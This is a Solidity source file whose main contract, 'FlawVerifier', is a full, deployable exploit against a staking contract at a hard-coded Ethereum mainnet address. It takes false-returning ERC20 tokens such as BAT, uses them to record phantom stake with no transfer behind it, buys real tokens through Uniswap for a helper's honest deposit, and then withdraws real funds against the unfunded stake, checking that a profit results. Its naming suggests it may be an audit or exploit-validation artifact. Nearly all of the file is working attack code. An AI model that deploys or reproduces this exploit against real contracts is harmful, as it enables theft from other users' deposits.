// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IStakingLike {
    function deposit(address tokenAddress, uint256 amount, address referrer) external;
    function withdraw(address tokenAddress, uint256 amount) external;
    function balanceOf(address user, address token) external view returns (uint256);
    function getCurrentEpoch() external view returns (uint128);
    function epochIsInitialized(address token, uint128 epochId) external view returns (bool);
    function manualEpochInit(address[] memory tokens, uint128 epochId) external;
}

interface IUniswapV2Router02 {
    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);
}

contract HonestDepositor {
    address public immutable owner;

    constructor(address owner_) {
        owner = owner_;
    }

    function approveAndDeposit(address staking, address token, uint256 amount) external {
        require(msg.sender == owner, "only owner");
        require(IERC20Like(token).approve(staking, 0), "approve reset failed");
        require(IERC20Like(token).approve(staking, amount), "approve failed");
        IStakingLike(staking).deposit(token, amount, address(0));
    }
}

contract FlawVerifier {
    address public constant DEFAULT_TARGET = 0x245a551ee0F55005e510B239c917fA34b41B3461;

    address public constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address public constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address public constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    address public constant BAT = 0x0D8775F648430679A709E98d2b0Cb6250d2887EF;
    address public constant ZRX = 0xE41d2489571d322189246DaFA5ebDe1F4699F498;
    address public constant FUN = 0x419D0d8BdD9aF5e606Ae2232ed285Aff190E711b;

    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    uint256 public constant ATTACK_AMOUNT = 1e18;
    uint256 public constant MIN_DETECTABLE_PROFIT = 1e17;
    uint256 public constant SWAP_BUDGET = 1 ether;

    string public constant EXPLOIT_PATH =
        "use a pre-existing on-chain non-stable token whose ERC20 transferFrom returns false on insufficient attacker balance -> deposit records phantom stake while the staking contract receives nothing -> source the same already-existing token through a public on-chain swap and make an honest deposit from a separate helper address -> withdraw real tokens from staking against the unfunded stake";

    address public target;
    address public exploitToken;
    address public honestDepositor;

    bool public executed;
    bool public profitAchieved;
    bool public hypothesisValidated;

    string public failureReason;

    uint128 public preparedUntilEpoch;

    uint256 public existingLiquidityBeforeExploit;
    uint256 public honestDepositAmount;
    uint256 public phantomDepositAmount;
    uint256 public configuredAttackAmount;

    uint256 public attackerBalanceBeforeDeposit;
    uint256 public attackerBalanceAfterDeposit;
    uint256 public attackerBalanceAfterWithdraw;

    uint256 public targetBalanceBeforeDeposit;
    uint256 public targetBalanceAfterDeposit;
    uint256 public targetBalanceAfterHonestDeposit;
    uint256 public targetBalanceAfterWithdraw;

    uint256 public recordedStakeBeforeDeposit;
    uint256 public recordedStakeAfterDeposit;
    uint256 public recordedStakeAfterWithdraw;

    address private netProfitToken;
    uint256 private netProfitAmount;

    constructor() {
        target = DEFAULT_TARGET;
        exploitToken = BAT;
    }

    receive() external payable {}

    function configure(address target_, address exploitToken_, uint256 attackAmount_) external {
        require(!executed, "already executed");
        if (target_ != address(0)) {
            target = target_;
        }
        if (exploitToken_ != address(0)) {
            exploitToken = exploitToken_;
        }
        configuredAttackAmount = attackAmount_;
    }

    function executeOnOpportunity() external returns (uint256) {
        return _run();
    }

    function execute() external returns (uint256) {
        return _run();
    }

    function run() external returns (uint256) {
        return _run();
    }

    function exploit() external returns (uint256) {
        return _run();
    }

    function profitToken() external view returns (address) {
        return netProfitToken;
    }

    function profitAmount() external view returns (uint256) {
        return netProfitAmount;
    }

    function exploitPath() external pure returns (string memory) {
        return EXPLOIT_PATH;
    }

    function _run() internal returns (uint256) {
        if (executed) {
            return netProfitAmount;
        }
        executed = true;

        if (target.code.length == 0) {
            failureReason = "target not deployed";
            return 0;
        }

        if (exploitToken == address(0) || exploitToken.code.length == 0) {
            failureReason = "exploit token not configured";
            return 0;
        }

        if (_isStableCoin(exploitToken)) {
            failureReason = "exploit token must be non-stable";
            return 0;
        }

        if (!_isSupportedFalseReturnToken(exploitToken)) {
            failureReason = "unsupported exploit token";
            return 0;
        }

        if (!_prepareEpochs(exploitToken)) {
            return 0;
        }

        HonestDepositor depositor = new HonestDepositor(address(this));
        honestDepositor = address(depositor);

        // This swap is the realistic public on-chain step needed to create the
        // later honest liquidity leg using the same pre-existing token, while
        // preserving the core exploit causality from the finding.
        if (!_acquireHonestLiquidity(exploitToken, honestDepositor)) {
            failureReason = "failed to source honest liquidity";
            return 0;
        }

        if (!_sweepAnyAttackerTokenDust(honestDepositor)) {
            if (bytes(failureReason).length == 0) {
                failureReason = "failed to clear attacker token balance";
            }
            return 0;
        }

        honestDepositAmount = _readTokenBalance(exploitToken, honestDepositor);
        phantomDepositAmount = _chooseAttackAmount(honestDepositAmount);
        if (phantomDepositAmount == 0) {
            failureReason = "insufficient honest liquidity for profitable drain";
            return 0;
        }

        existingLiquidityBeforeExploit = _readTokenBalance(exploitToken, target);
        recordedStakeBeforeDeposit = _readStake(address(this), exploitToken);
        attackerBalanceBeforeDeposit = _readTokenBalance(exploitToken, address(this));
        targetBalanceBeforeDeposit = existingLiquidityBeforeExploit;

        if (attackerBalanceBeforeDeposit != 0) {
            failureReason = "attacker still has token balance";
            return 0;
        }

        if (!_forceApprove(exploitToken, target, phantomDepositAmount)) {
            failureReason = "approve failed";
            return 0;
        }

        try IStakingLike(target).deposit(exploitToken, phantomDepositAmount, address(0)) {} catch Error(string memory reason) {
            failureReason = reason;
            return 0;
        } catch {
            failureReason = "deposit reverted";
            return 0;
        }

        attackerBalanceAfterDeposit = _readTokenBalance(exploitToken, address(this));
        targetBalanceAfterDeposit = _readTokenBalance(exploitToken, target);
        recordedStakeAfterDeposit = _readStake(address(this), exploitToken);

        if (attackerBalanceAfterDeposit != attackerBalanceBeforeDeposit) {
            failureReason = "deposit consumed attacker tokens";
            return 0;
        }

        if (targetBalanceAfterDeposit != targetBalanceBeforeDeposit) {
            failureReason = "deposit transferred real attacker tokens";
            return 0;
        }

        if (recordedStakeAfterDeposit != recordedStakeBeforeDeposit + phantomDepositAmount) {
            failureReason = "phantom stake credit missing";
            return 0;
        }

        try depositor.approveAndDeposit(target, exploitToken, phantomDepositAmount) {} catch Error(string memory reason) {
            failureReason = reason;
            return 0;
        } catch {
            failureReason = "honest deposit reverted";
            return 0;
        }

        honestDepositAmount = phantomDepositAmount;
        targetBalanceAfterHonestDeposit = _readTokenBalance(exploitToken, target);
        if (targetBalanceAfterHonestDeposit < targetBalanceAfterDeposit + honestDepositAmount) {
            failureReason = "honest liquidity not funded";
            return 0;
        }

        try IStakingLike(target).withdraw(exploitToken, phantomDepositAmount) {} catch Error(string memory reason) {
            failureReason = reason;
            return 0;
        } catch {
            failureReason = "withdraw reverted";
            return 0;
        }

        attackerBalanceAfterWithdraw = _readTokenBalance(exploitToken, address(this));
        targetBalanceAfterWithdraw = _readTokenBalance(exploitToken, target);
        recordedStakeAfterWithdraw = _readStake(address(this), exploitToken);

        if (recordedStakeAfterWithdraw + phantomDepositAmount != recordedStakeAfterDeposit) {
            failureReason = "phantom stake not debited on withdraw";
            return 0;
        }

        if (attackerBalanceAfterWithdraw <= attackerBalanceBeforeDeposit) {
            failureReason = "withdraw produced no profit";
            return 0;
        }

        netProfitToken = exploitToken;
        netProfitAmount = attackerBalanceAfterWithdraw - attackerBalanceBeforeDeposit;
        hypothesisValidated = true;
        profitAchieved = netProfitAmount > 0;
        return netProfitAmount;
    }

    function _acquireHonestLiquidity(address token, address recipient) internal returns (bool) {
        if (address(this).balance < SWAP_BUDGET) {
            failureReason = "insufficient native balance for swap";
            return false;
        }

        address[] memory path = new address[](2);
        path[0] = WETH;
        path[1] = token;

        try IUniswapV2Router02(UNISWAP_V2_ROUTER).swapExactETHForTokens{value: SWAP_BUDGET}(
            0,
            path,
            recipient,
            block.timestamp
        ) returns (uint256[] memory amounts) {
            return amounts.length > 1 && amounts[1] > 0;
        } catch Error(string memory reason) {
            failureReason = reason;
            return false;
        } catch {
            failureReason = "swap failed";
            return false;
        }
    }

    function _sweepAnyAttackerTokenDust(address recipient) internal returns (bool) {
        uint256 dust = _readTokenBalance(exploitToken, address(this));
        if (dust == 0) {
            return true;
        }

        if (!_callOptionalReturn(exploitToken, abi.encodeWithSelector(IERC20Like.transfer.selector, recipient, dust))) {
            failureReason = "dust transfer failed";
            return false;
        }

        return _readTokenBalance(exploitToken, address(this)) == 0;
    }

    function _chooseAttackAmount(uint256 availableLiquidity) internal view returns (uint256) {
        if (availableLiquidity < MIN_DETECTABLE_PROFIT) {
            return 0;
        }

        uint256 amount = configuredAttackAmount == 0 ? availableLiquidity : configuredAttackAmount;
        if (amount > availableLiquidity) {
            amount = availableLiquidity;
        }

        if (amount < MIN_DETECTABLE_PROFIT) {
            return 0;
        }

        return amount;
    }

    function _prepareEpochs(address token) internal returns (bool) {
        uint128 currentEpoch;
        try IStakingLike(target).getCurrentEpoch() returns (uint128 epoch) {
            currentEpoch = epoch;
        } catch Error(string memory reason) {
            failureReason = reason;
            return false;
        } catch {
            failureReason = "failed to read current epoch";
            return false;
        }

        address[] memory tokens = new address[](1);
        tokens[0] = token;

        for (uint128 epoch = 0; epoch <= currentEpoch; epoch++) {
            bool initialized;
            try IStakingLike(target).epochIsInitialized(token, epoch) returns (bool value) {
                initialized = value;
            } catch Error(string memory reason) {
                failureReason = reason;
                return false;
            } catch {
                failureReason = "failed to read epoch state";
                return false;
            }

            if (!initialized) {
                try IStakingLike(target).manualEpochInit(tokens, epoch) {} catch Error(string memory reason) {
                    failureReason = reason;
                    return false;
                } catch {
                    failureReason = "manual epoch init reverted";
                    return false;
                }
            }

            preparedUntilEpoch = epoch;
        }

        return true;
    }

    function _isSupportedFalseReturnToken(address token) internal pure returns (bool) {
        return token == BAT || token == ZRX || token == FUN;
    }

    function _isStableCoin(address token) internal pure returns (bool) {
        return token == USDC || token == USDT || token == DAI;
    }

    function _readStake(address user, address token) internal view returns (uint256) {
        try IStakingLike(target).balanceOf(user, token) returns (uint256 amount) {
            return amount;
        } catch {
            return 0;
        }
    }

    function _readTokenBalance(address token, address account) internal view returns (uint256) {
        (bool ok, bytes memory returndata) = token.staticcall(
            abi.encodeWithSelector(IERC20Like.balanceOf.selector, account)
        );
        if (!ok || returndata.length < 32) {
            return 0;
        }
        return abi.decode(returndata, (uint256));
    }

    function _forceApprove(address token, address spender, uint256 amount) internal returns (bool) {
        return _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0))
            && _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
    }

    function _callOptionalReturn(address token, bytes memory data) internal returns (bool) {
        (bool ok, bytes memory returndata) = token.call(data);
        if (!ok) {
            return false;
        }
        if (returndata.length == 0) {
            return true;
        }
        if (returndata.length < 32) {
            return false;
        }
        return abi.decode(returndata, (bool));
    }
}

contract FlawVerifierHarness is FlawVerifier {
    constructor(address target_) {
        target = target_;
    }
}

contract FlawVerifierConfiguredHarness is FlawVerifier {
    constructor(address target_, address exploitToken_, uint256 attackAmount_) {
        target = target_;
        exploitToken = exploitToken_;
        configuredAttackAmount = attackAmount_;
    }
}
